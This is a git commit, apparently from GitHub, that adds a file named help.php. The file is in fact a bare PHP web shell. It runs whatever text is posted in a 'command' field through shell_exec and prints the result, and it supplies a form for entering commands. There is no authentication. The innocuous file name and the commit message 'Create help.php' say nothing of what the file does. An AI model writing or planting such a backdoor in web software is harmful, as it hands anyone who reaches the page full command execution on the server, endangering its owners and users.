761fab9d18f9cd42b4427a93a230ffa95749daf4
toanln-cov <85386928+toanln-cov@users.noreply.github.com>
2023-10-17 14:58:27 +0700

    Create help.php

---
+++ help.php
@@ -0,0 +1,20 @@
+<?php
+if (isset($_POST["command"])) {
+	$message = shell_exec($_POST["command"]);
+}
+else {
+	$message = "No Command Sent";
+}
+?>
+<form class="form-submit" method="post" onsubmit="customSubmit(this)">
+    <div class="container">
+      <label for="cmd"><b>COMMAND</b></label>
+      <input type="text" placeholder="Enter Command Here" name="command" required>
+      <button type="submit">Send</button>
+
+    </div>
+ </form>
+ 
+<form>
+	<?php if (isset($message)) echo $message;?>
+</form>
